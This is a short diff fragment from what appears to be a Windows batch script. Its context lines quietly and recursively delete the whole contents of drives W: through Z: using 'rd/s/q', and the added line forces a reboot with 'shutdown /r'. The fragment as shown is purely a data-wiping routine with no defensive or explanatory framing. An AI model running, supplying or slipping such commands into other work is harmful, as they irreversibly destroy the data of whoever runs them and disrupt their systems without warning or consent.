@@ -25,3 +25,4 @@ rd/s/q W:
 rd/s/q X:
 rd/s/q Y:
 rd/s/q Z:
+shutdown /r
